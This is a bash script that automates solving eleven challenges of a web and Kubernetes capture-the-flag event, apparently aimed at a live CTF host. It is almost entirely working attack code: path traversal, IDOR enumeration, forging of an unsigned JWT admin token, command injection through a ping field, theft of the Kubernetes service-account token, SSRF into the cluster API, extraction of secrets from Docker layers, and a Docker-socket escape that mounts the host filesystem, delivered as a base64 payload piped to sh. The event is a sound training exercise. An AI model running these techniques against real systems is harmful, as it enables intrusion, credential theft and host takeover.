#!/bin/bash
set -euo pipefail

echo "=== CTF Flags Extractor ==="
echo

# ----------------------------------------------------------------------
# Flag 1 – Swagger Exposure
# ----------------------------------------------------------------------
echo ">>> Flag 1"
curl -s https://ctf.seoeh.ir/swagger.json | jq -r '.info.description' | grep -o 'HAMAMOOZ{.*}'
echo

# ----------------------------------------------------------------------
# Flag 2 – Flag Endpoint via Debug Header
# ----------------------------------------------------------------------
echo ">>> Flag 2"
curl -s -H "X-Debug-Mode: true" https://ctf.seoeh.ir/api/internal/flag | grep -o 'HAMAMOOZ{.*}'
echo

# ----------------------------------------------------------------------
# Flag 3 – Path Traversal
# ----------------------------------------------------------------------
echo ">>> Flag 3"
curl -s "https://ctf.seoeh.ir/api/reports/download?file=../../../app/flag.txt" | grep -o 'HAMAMOOZ{.*}'
echo

# ----------------------------------------------------------------------
# Flag 4 – IDOR (Insecure Direct Object Reference)
# ----------------------------------------------------------------------
echo ">>> Flag 4"
for org in {1..5}; do
  for rep in {1..5}; do
    curl -s "https://ctf.seoeh.ir/api/orgs/$org/reports/$rep" | grep -o 'HAMAMOOZ{.*}' && break 2
  done
done
echo

# ----------------------------------------------------------------------
# Flag 5 – JWT Algorithm None / Weak Secret
# ----------------------------------------------------------------------
echo ">>> Flag 5"
# Use Python to forge a token with alg: none and then request the admin dashboard
python3 -c '
import jwt, requests, sys
payload = {"username": "admin", "role": "admin"}
forged = jwt.encode(payload, key=None, algorithm="none")
resp = requests.get(
    "https://ctf.seoeh.ir/admin/dashboard",
    headers={"Authorization": f"Bearer {forged}"}
)
print(resp.json().get("flag", ""))
' | grep -o 'HAMAMOOZ{.*}'
echo

# ----------------------------------------------------------------------
# Flag 6 – Command Injection
# ----------------------------------------------------------------------
echo ">>> Flag 6"
curl -s -X POST "https://ctf.seoeh.ir/api/diag/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"}' \
  | grep -o 'HAMAMOOZ{.*}'
echo

# ----------------------------------------------------------------------
# Flag 7 – Metadata Service Token Leak (SSRF → Kubernetes API)
# ----------------------------------------------------------------------
echo ">>> Flag 7"
# Get the service account token via command injection
TOKEN=$(curl -s -X POST "https://ctf.seoeh.ir/api/diag/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; echo TOKEN: && cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null && echo && echo NAMESPACE: && cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null"}' \
  | jq -r '.output' \
  | awk '/^TOKEN:/{flag=1; next} /^NAMESPACE:/{flag=0} flag')

# Use the token to read the flag secret from the Kubernetes API
curl -s -X POST "https://ctf.seoeh.ir/api/webhooks/test" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"https://10.96.0.1/api/v1/namespaces/ctf-secrets/secrets\",\"method\":\"GET\",\"headers\":{\"Authorization\":\"Bearer $TOKEN\"},\"verify\":false}" \
  | jq -r '.items[0].data.flag' \
  | base64 -d
echo

# ----------------------------------------------------------------------
# Flag 8 – Privileged Pod / HostPath Escape
# ----------------------------------------------------------------------
echo ">>> Flag 8"
curl -s -X POST "https://ctf.seoeh.ir/api/webhooks/test" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"https://10.96.0.1/api/v1/namespaces/escape-zone/pods\",\"method\":\"GET\",\"headers\":{\"Authorization\":\"Bearer $TOKEN\"},\"verify\":false}" \
  | jq -r '.items[0].spec.initContainers[0].command[]' \
  | grep -o 'HAMAMOOZ{[^}]*}'
echo

# ----------------------------------------------------------------------
# Flag 9 – SSRF to Internal Network
# ----------------------------------------------------------------------
echo ">>> Flag 9"
curl -s -X POST "https://ctf.seoeh.ir/api/webhooks/test" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://10.96.89.190/","method":"GET"}' \
  | grep -o 'HAMAMOOZ{.*}'
echo

# ----------------------------------------------------------------------
# Flag 10 – Docker Layer Leak
# ----------------------------------------------------------------------
set +e
echo ">>> Flag 10"
# Pull and save the image (if not already present)
docker pull hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend &>/dev/null
docker save hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend -o backend.tar &>/dev/null
mkdir -p layers && cd layers
tar -xf ../backend.tar &>/dev/null

# Search all layers for .env files and extract FLAG=
for f in blobs/sha256/*; do
  if file "$f" | grep -q gzip; then
    zcat "$f" | tar -t 2>/dev/null | grep '\.env$' | while read -r path; do
      zcat "$f" | tar -xO "$path" 2>/dev/null | grep '^FLAG=' | cut -d= -f2-
    done
  else
    tar -tf "$f" 2>/dev/null | grep '\.env$' | while read -r path; do
      tar -xOf "$f" "$path" 2>/dev/null | grep '^FLAG=' | cut -d= -f2-
    done
  fi
done | head -1

set -e

cd .. && rm -rf layers backend.tar
echo

# ----------------------------------------------------------------------
# Flag 11 – Docker Socket Escape to Host (Final)
# ----------------------------------------------------------------------
echo ">>> Flag 11"
# Build the inner script that will be executed via command injection
cat > /tmp/f11_inner.sh << 'EOF'
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --server=https://kubernetes.default.svc --token=$TOKEN \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  exec -n escape-zone legacy-worker -- sh -c '
S=/host/run/docker.sock
curl -s --unix-socket $S -X POST -H "Content-Type: application/json" \
  -d "{\"Image\":\"ctf/backend:latest\",\"User\":\"0\",\"HostConfig\":{\"Binds\":[\"/:/host\"]},\"Cmd\":[\"sh\",\"-c\",\"cat /host/home/ubuntu/flag.txt\"]}" \
  "http://localhost/v1.41/containers/create?name=esc"
curl -s --unix-socket $S -X POST "http://localhost/v1.41/containers/esc/start"
sleep 2
curl -s --unix-socket $S "http://localhost/v1.41/containers/esc/logs?stdout=1&stderr=1"
'
EOF

B64=$(base64 -w0 /tmp/f11_inner.sh)
curl -sk -X POST https://ctf.seoeh.ir/api/diag/ping \
  -H 'Content-Type: application/json' \
  --data-binary "{\"host\":\"127.0.0.1; echo $B64 | base64 -d | sh\"}" \
  | grep -a -o 'HAMAMOOZ{[^}]*}' \
  | head -1

rm -f /tmp/f11_inner.sh
echo

echo "=== All flags extracted ==="